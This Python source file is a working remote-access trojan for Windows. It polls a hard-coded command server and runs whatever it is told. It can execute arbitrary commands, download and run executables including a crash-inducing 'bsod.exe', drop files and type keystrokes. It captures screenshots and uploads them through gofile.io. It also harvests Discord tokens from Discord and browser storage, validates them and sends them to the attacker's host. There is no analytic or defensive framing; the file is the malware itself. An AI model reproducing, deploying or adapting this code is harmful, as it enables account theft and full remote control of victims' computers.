from requests import RequestException, JSONDecodeError, post, get
from os import listdir, remove, getenv, getcwd, chdir
from subprocess import CREATE_NEW_CONSOLE, Popen
from PIL import UnidentifiedImageError, Image
from fleep import get as get_soundtype
from playsound import playsound
from threading import Thread
from base64 import b64decode
from time import time, sleep
from random import choices
from os.path import isdir
from re import findall
from sys import exit
import pyautogui


DELAY = 5
IP = "mkz.dk"
PORT = 80
SCHEME = "http"
CONNECT_TIMEOUT = 5
connected: bool = False
pyautogui.FAILSAFE = False


class Base64Encoded(str):
    def __init__(self) -> None:
        super().__init__()


def main() -> None:
    global connected

    try:
        while True:
            start_time = time()
            try:
                action_response: dict = get(
                    f"{SCHEME}://{IP}:{PORT}/global-center"
                ).json()
            except JSONDecodeError:
                if connected:
                    print("Asked server for actions.")
                else:
                    print("Connected, and asked server for actions.")
                    connected = True
                sleep_time = DELAY - (time() - start_time)
                if sleep_time >= 0:
                    sleep(sleep_time)
                continue

            if "command" in action_response:
                run_command(action_response["command"])
            if "image" in action_response:
                show_image(action_response["image"])
            if "bsod" in action_response:
                invoke_bsod()
            if "runfile" in action_response:
                run_file(
                    action_response["runfile"]["runfile"],
                    action_response["runfile"]["runfile_args"],
                )
            if "screenshot" in action_response:
                post_screenshot()
            if "website" in action_response:
                open_website(action_response["website"])
            if "dropfile" in action_response:
                drop_file(
                    action_response["dropfile"]["dropfile"],
                    action_response["dropfile"]["dropfile_location"],
                )
            if "getuser" in action_response:
                send_user()
            if "playsound" in action_response:
                play_sound(action_response["playsound"])
            if "typestring" in action_response:
                Thread(
                    target=typestring_thread,
                    args=[
                        action_response["typestring"]["typestring"],
                        action_response["typestring"]["typestring_delay"],
                    ],
                ).start()
            if "gettokens" in action_response:
                send_tokens()

            if not connected:
                print(f"Connected and did {len(action_response)} actions.")
                connected = True
            else:
                print(f"Did {len(action_response)} actions.")
            sleep_time = DELAY - (time() - start_time)
            if sleep_time >= 0:
                sleep(sleep_time)
    except RequestException:
        if connected:
            print("Lost connection, retrying...")
        else:
            print("Failed to connect, retrying...")
        connected = False
        main()
    except KeyboardInterrupt:
        print("Goodbye...")
        sleep(1.5)
        exit()
    except Exception as error:
        print(error)
        connected = False
        main()


def send_tokens() -> None:
    # grabber code from https://github.com/wodxgod/Discord-Token-Grabber/

    roaming = getenv("AppData")
    local = getenv("LocalAppData")

    for path in [
        roaming + r"\Discord",
        roaming + r"\discordcanary",
        roaming + r"\discordptb",
        local + r"\Google\Chrome\User Data\Default",
        roaming + r"\Opera Software\Opera Stable",
        local + r"\BraveSoftware\Brave-Browser\User Data\Default",
        local + r"\Yandex\YandexBrowser\User Data\Default",
    ]:
        path += r"\Local Storage\leveldb"
        if not isdir(path):
            continue

        tokens = []

        for file_name in listdir(path):
            if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                continue

            for line in [
                line.strip()
                for line in open(rf"{path}\{file_name}", errors="ignore").readlines()
                if line.strip()
            ]:
                for regex in [r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"]:
                    for token in findall(regex, line):
                        if token not in tokens:
                            Thread(
                                target=check_and_send_token,
                                args=[token],
                                name="send_token",
                            ).start()  # for async requests
                            tokens.append(token)


def typestring_thread(text: str, delay: float) -> None:
    try:
        pyautogui.typewrite(text, delay)
    except Exception as error:
        print(error)


def play_sound(soundfile_data: Base64Encoded) -> None:
    old_cd = getcwd()
    chdir(getenv("temp"))
    decoded = b64decode(soundfile_data)
    sound_type = get_soundtype(decoded).extension[0]
    filename = (
        f"{''.join(choices('abcdefghijklmnopqrstuvwxyz1234567890', k=5))}.{sound_type}"
    )
    with open(filename, "wb") as temp_file:
        temp_file.write(decoded)
    playsound(filename, block=False)
    chdir(old_cd)


def send_user() -> None:
    post(f"{SCHEME}://{IP}:{PORT}/getuser-center?username={getenv('USERNAME')}")


def drop_file(content: str, location: str) -> None:
    with open(location, "wb") as dropped_file:
        dropped_file.write(b64decode(content))


def open_website(url: str) -> None:
    Popen(f'powershell -Command "start {url}"')


def post_screenshot() -> None:
    old_cd = getcwd()
    chdir(getenv("temp"))
    pyautogui.screenshot().save("temp.png", "png")
    upload_url = (
        "https://"
        + get("https://api.gofile.io/getServer").json().get("data").get("server")
        + ".gofile.io/uploadFile"
    )
    with open("temp.png", "rb") as temp_file:
        download_page: str = (
            post(upload_url, files={"file": temp_file})
            .json()
            .get("data")
            .get("downloadPage")
        )
    remove("temp.png")
    chdir(old_cd)
    post(f"{SCHEME}://{IP}:{PORT}/screenshot-center?download_page={download_page}")


def run_file(file_data: Base64Encoded, args: str) -> None:
    old_cd = getcwd()
    chdir(getenv("temp"))
    with open("temp.exe", "wb") as temp_file:
        temp_file.write(b64decode(file_data))
    Popen(
        f"temp.exe {args}",
        creationflags=CREATE_NEW_CONSOLE,
    )
    chdir(old_cd)


def invoke_bsod() -> None:
    chdir(getenv("temp"))
    with open("temp.exe", "wb") as temp_file:
        temp_file.write(get(f"{SCHEME}://{IP}:{PORT}/bsod.exe").content)
    Popen("temp.exe")


def show_image(image_data: Base64Encoded) -> None:
    with open("temp", "wb") as temp_image_file:
        temp_image_file.write(b64decode(image_data))
    try:
        Image.open("temp").show()
    except UnidentifiedImageError:
        pass
    remove("temp")


def run_command(command: str) -> None:
    Popen(command)


def check_and_send_token(token: str) -> None:
    if (
        get(
            f"https://discord.com/api/users/@me", headers={"Authorization": token}
        ).status_code
        != 200
    ):
        return  # invalid token check

    post(f"{SCHEME}://{IP}:{PORT}/gettokens-center?token={token}")


if __name__ == "__main__":
    main()
